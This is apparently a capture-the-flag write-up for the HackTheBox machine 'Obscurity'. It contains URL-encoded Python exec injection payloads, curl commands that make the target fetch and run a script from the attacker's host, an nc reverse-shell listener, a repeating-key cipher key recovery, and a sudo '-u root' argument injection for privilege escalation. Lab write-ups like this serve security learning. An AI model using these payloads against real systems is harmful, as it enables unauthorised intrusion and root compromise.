# Obscurity

Details:
- Obscurity IP: 10.10.10.168
- Kali IP: 10.10.14.145
- Date of writeup: 9 May 2020
- First box for which I have the writeup before the box gets retired!

A fun box with an important message: security by obscurity is NOT security!
As the name implies, the box is mainly custom exploitation.

Sections:
- [Recon](#recon)
- [Custom exploitation of the server](#custom-exploitation-of-the-server)
- [Getting to user](#getting-to-user)
- [Privesc](#privesc)
- [Learnings from ippsec walkthrough](#learnings-from-ippsec-walkthrough)

Tools/commands used
- nmap
- [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

## Recon
First things first: run nmap
```kali$  nmap -sC -sV 10.10.10.168```

![](images/Obscurity_2.png?raw=true)

Port 8080 looks interesting. BadHttpServer, that’s gotta be something, right?
Browsing through it, we find out a couple of important things:
- The web server is running custom-made software.
- There is custom-made encryption
- There is a custom-made SSH client (seems to be inside the box, port 22 shown in nmap scan is openssh)

![](images/Obscurity_3.png?raw=true)

- There is a message to developers:

![](images/Obscurity_4.png?raw=true)

If we can get that python script, then we would have the server code and know if there is a vulnerability. It seems promising to attempt a directory traversal attack. While doing so, I’ll also run dirbuster, just in case.

I ended up being a bit lucky and retrieved the python script by performing a GET request to ```/..%2fSuperSecureServer.py```

![](images/Obscurity_5.png?raw=true)


## Custom exploitation of the server

We now have the python script. Going through it, you can find the following:

```python
    def serveDoc(self, path, docRoot):
        path = urllib.parse.unquote(path)
        try:
            info = "output = 'Document: {}'" # Keep the output for later debug
            exec(info.format(path)) # This is how you do string formatting, right?
            cwd = os.path.dirname(os.path.realpath(__file__))
            docRoot = os.path.join(cwd, docRoot)
	...
```

There’s clearly a coding error there that allows remote code execution (RCE). We just need to get the payload past the verification performed elsewhere in the code, via the URL path. To do this, I copied the server code and added the appropriate lines to start it, so I could host it locally and print the path I was receiving at that point in the code:

```python
srv=Server("127.0.0.1",4444)
srv.listen()
```

![](images/Obscurity_6.png?raw=true)

As you can see in the image, at this point I have everything up and running to attempt an RCE.

```
GET /index.html';os.system('echo whatever');output='Document: index.html
```

The reasoning behind this is that I would want the ```format``` command to transform the info variable into the following, so that when executed by the ```exec``` command it would also run my ```os.system``` command:

```python
info = "output = 'Document: {}'"
info.format(path)
# info = “output = 'Document: index.html';os.system('echo whatever');output='Document: index.html'”
```

Trying this GET request in my locally hosted server should have made it echo the word “whatever”. However, I wasn’t achieving it. I finally realized that I needed to URL encode almost everything (parentheses and quotes included). To easily find URL encoding, look at the third column in command ```man ascii```

| Character  | URL encoding |
| ------------- | ------------- |
| Space  | %20  |
| “  | %22  |
| ‘  | %27  |
| (  | %28  |
| )  | %29  |
| /  | %2F  |
| :  | %3A  |
| ;  | %3B  |
| =  | %3D  |

Now, to confirm that our RCE is working in the remote box, you can make it ping your own IP:

![](images/Obscurity_7.png?raw=true)

I get a bunch of ICMP ping requests.

To get a shell, what I did was to upload a python script and ran it to get a reverse shell while listening at port 4444

```
kali1$  python3 -m http.server 8081
kali2$  curl http://10.10.10.168:8080/index.html%27%3bos.system%28%27wget%20http%3a%2f%2f10.10.14.145%3A8081%2fscript.py%27%29%3boutput%3d%27Document%3a%20index.html
kali1$  nc -lvnp 4444
kali2$  curl http://10.10.10.168:8080/index.html%27%3bos.system%28%27python3%20script.py%27%29%3boutput%3d%27Document%3a%20index.html
```

## Getting to user

The shell we got, we got it as ```www-data```. I uploaded [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) and ran it. I realized in the results that ```/home/robert``` was readable.

In there, there's a couple of interesting files
- check.txt: there’s a note here
- out.txt: cipher text
- passwordreminder.txt: cipher text
- SuperSecureCrypt.py: encryption/decryption script
- BetterSSH folder

```
www-data$  cat /home/robert/check.txt
Encrypting this file with your key should result in out.txt, make sure your key is correct!
```

Ok, it’s clear now that what we need to do is to reverse the encryption key to be able to decrypt the cipher in ```passwordreminder.txt```. We just need to take a look at the python script. 
The encryption was just a couple of basic operations using a key that had no restrictions as to its minimal length. Characters were encrypted one by one, using only one character of the key at a time. If the key wasn’t long enough, it would repeat itself. Kind of a very old encryption method, I don’t recall now how they are called. If the key was "hello", it would keep concatenating it "hellohellohello" as needed for each of the input characters.

```python
def encrypt(text, key):
    keylen = len(key)
    keyPos = 0
    encrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr + ord(keyChr)) % 255)
        print(ord(newChr))
        encrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return encrypted
```

This is very easy to revert. I just converted the characters in ```check.txt``` and ```out.txt``` to numbers, attempted the encryption operation with numbers starting from 0 and increasing by 1 (representing what could be the characters in the key) for each couple of chars. When equal, we've found a letter of the key.

```python
def decrypt_key(textI, textO):
    key = []
    index = 0
    while index < len(textI):
        newChr = int(textI[index])
        ki = 0
        while(1):
            testChr = ((newChr + ki) % 255)
            if testChr == int(textO[index]):
                key.append(ki)
                break;
            ki = ki + 1
        index = index + 1
        print(chr(ki))
    return key
```

You obviously need to account for the formatting of your data: you get it as unicode characters in the files, but to work on them it’s easier and more understandable if you get their numeric representation.

Once done the key reversion, we find out it is ```alexandrovich```, we can now decrypt the passwordreminder and obtain robert’s password.

## Privesc

It’s also pretty easy to get root. Running linpeas as robert, we find out that there's a command that can be run as root without password.

![](images/Obscurity_8.png?raw=true)

That's the python script in BetterSSH folder. This script authenticates a user and runs a command for them. We don't currently own any other user than robert, so if this was properly done, we shouldn’t be able to run with any other user.

```python
if session['authenticated'] == 1:
    while True:
        command = input(session['user'] + "@Obscure$ ")
        cmd = ['sudo', '-u',  session['user']]
        cmd.extend(command.split(" "))
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        o,e = proc.communicate()
        print('Output: ' + o.decode('ascii'))
        print('Error: '  + e.decode('ascii')) if len(e.decode('ascii')) > 0 else print('')
```

Alright, a coding error, once again. We have control of the ```command``` parameter. If we input ```-u root whoami```, we’ll be running as root. You can try this yourself, just run the following and see the response.

```
kali$ sudo -u user -u root whoami
```

The first ```-u``` is “overwritten” by the second.

![](images/Obscurity_9.png?raw=true)

##Learnings from ippsec walkthrough

TODO
